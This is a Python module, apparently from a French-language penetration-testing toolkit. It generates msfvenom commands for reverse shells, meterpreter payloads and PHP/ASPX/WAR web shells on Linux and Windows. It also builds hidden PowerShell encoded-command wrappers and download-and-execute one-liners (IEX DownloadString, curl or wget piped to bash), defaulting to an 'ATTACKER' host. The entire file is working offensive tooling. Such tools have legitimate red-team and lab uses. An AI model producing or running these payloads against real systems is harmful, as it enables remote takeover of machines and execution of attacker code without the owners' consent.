"""Payload Helper — génère des commandes msfvenom et wrappers.

Pas d'exécution : on génère les lignes de commande. L'user décide de
les lancer dans un terminal tab. Couvre :
- msfvenom reverse shells (linux/windows, x86/x64, staged/stageless)
- msfvenom web shells (php, aspx, jsp, war)
- wrappers PowerShell -EncodedCommand
- one-liners courts (base64 / IEX / downloadString)
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Dict, List, Optional

from .encoder import encode_powershell_base64
from .logger import get_logger

log = get_logger(__name__)


@dataclass
class PayloadSpec:
    label: str
    command: str
    description: str = ""
    output_file: str = ""
    kind: str = "msfvenom"      # msfvenom / wrapper / oneliner


# --------------------------------------------------------------
# msfvenom
# --------------------------------------------------------------

def msfvenom_linux_x64(lhost: str, lport: int, staged: bool = False, out: str = "shell.elf") -> PayloadSpec:
    payload = "linux/x64/meterpreter/reverse_tcp" if staged else "linux/x64/shell_reverse_tcp"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f elf > {out}"
    return PayloadSpec(
        label=f"msfvenom ELF x64 ({'meterpreter' if staged else 'shell'})",
        command=cmd,
        description="Linux 64 bits reverse shell / meterpreter.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_linux_x86(lhost: str, lport: int, staged: bool = False, out: str = "shell32.elf") -> PayloadSpec:
    payload = "linux/x86/meterpreter/reverse_tcp" if staged else "linux/x86/shell_reverse_tcp"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f elf > {out}"
    return PayloadSpec(
        label=f"msfvenom ELF x86 ({'meterpreter' if staged else 'shell'})",
        command=cmd,
        description="Linux 32 bits reverse shell / meterpreter.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_windows_x64(lhost: str, lport: int, staged: bool = False, out: str = "shell.exe") -> PayloadSpec:
    payload = "windows/x64/meterpreter/reverse_tcp" if staged else "windows/x64/shell_reverse_tcp"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe > {out}"
    return PayloadSpec(
        label=f"msfvenom EXE x64 ({'meterpreter' if staged else 'shell'})",
        command=cmd,
        description="Windows 64 bits reverse shell / meterpreter.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_windows_x86(lhost: str, lport: int, staged: bool = False, out: str = "shell32.exe") -> PayloadSpec:
    payload = "windows/meterpreter/reverse_tcp" if staged else "windows/shell_reverse_tcp"
    cmd = f"msfvenom -p {payload} LHOST={lhost} LPORT={lport} -f exe > {out}"
    return PayloadSpec(
        label=f"msfvenom EXE x86 ({'meterpreter' if staged else 'shell'})",
        command=cmd,
        description="Windows 32 bits reverse shell / meterpreter.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_php(lhost: str, lport: int, out: str = "shell.php") -> PayloadSpec:
    cmd = f"msfvenom -p php/reverse_php LHOST={lhost} LPORT={lport} -f raw > {out}"
    return PayloadSpec(
        label="msfvenom PHP",
        command=cmd,
        description="PHP reverse shell.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_aspx(lhost: str, lport: int, out: str = "shell.aspx") -> PayloadSpec:
    cmd = f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} -f aspx > {out}"
    return PayloadSpec(
        label="msfvenom ASPX",
        command=cmd,
        description="ASP.NET reverse shell pour IIS.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_war(lhost: str, lport: int, out: str = "shell.war") -> PayloadSpec:
    cmd = f"msfvenom -p java/jsp_shell_reverse_tcp LHOST={lhost} LPORT={lport} -f war > {out}"
    return PayloadSpec(
        label="msfvenom WAR",
        command=cmd,
        description="Java WAR pour Tomcat / JBoss.",
        output_file=out, kind="msfvenom",
    )


def msfvenom_psh(lhost: str, lport: int, out: str = "shell.ps1") -> PayloadSpec:
    cmd = (
        f"msfvenom -p windows/x64/shell_reverse_tcp LHOST={lhost} LPORT={lport} "
        f"-f psh-reflection > {out}"
    )
    return PayloadSpec(
        label="msfvenom PowerShell (reflection)",
        command=cmd,
        description="Script PowerShell réflexif (in-memory).",
        output_file=out, kind="msfvenom",
    )


# --------------------------------------------------------------
# wrappers / one-liners
# --------------------------------------------------------------

def powershell_encoded(command: str) -> PayloadSpec:
    enc = encode_powershell_base64(command)
    return PayloadSpec(
        label="PowerShell -EncodedCommand",
        command=f"powershell -nop -w hidden -EncodedCommand {enc}",
        description="Commande PowerShell encodée (UTF-16 LE + base64).",
        kind="wrapper",
    )


def powershell_iex_remote(url: str) -> PayloadSpec:
    return PayloadSpec(
        label="PowerShell IEX remote",
        command=(
            f"powershell -nop -c \"IEX(New-Object Net.WebClient)."
            f"DownloadString('{url}')\""
        ),
        description="Exécute un .ps1 hébergé à distance, en mémoire.",
        kind="oneliner",
    )


def linux_curl_exec(url: str) -> PayloadSpec:
    return PayloadSpec(
        label="Linux curl | bash",
        command=f"curl -s {url} | bash",
        description="Exécute un script hébergé à distance.",
        kind="oneliner",
    )


def linux_wget_exec(url: str) -> PayloadSpec:
    return PayloadSpec(
        label="Linux wget | bash",
        command=f"wget -qO- {url} | bash",
        description="Exécute un script hébergé à distance (fallback).",
        kind="oneliner",
    )


# --------------------------------------------------------------
# Génération par catégorie
# --------------------------------------------------------------

def all_reverse_shells(lhost: str, lport: int) -> List[PayloadSpec]:
    return [
        msfvenom_linux_x64(lhost, lport),
        msfvenom_linux_x64(lhost, lport, staged=True),
        msfvenom_linux_x86(lhost, lport),
        msfvenom_windows_x64(lhost, lport),
        msfvenom_windows_x64(lhost, lport, staged=True),
        msfvenom_windows_x86(lhost, lport),
        msfvenom_psh(lhost, lport),
    ]


def all_web_shells(lhost: str, lport: int) -> List[PayloadSpec]:
    return [
        msfvenom_php(lhost, lport),
        msfvenom_aspx(lhost, lport),
        msfvenom_war(lhost, lport),
    ]


def all_wrappers(command: str, url: str = "http://ATTACKER/shell.ps1") -> List[PayloadSpec]:
    return [
        powershell_encoded(command),
        powershell_iex_remote(url),
        linux_curl_exec(url),
        linux_wget_exec(url),
    ]
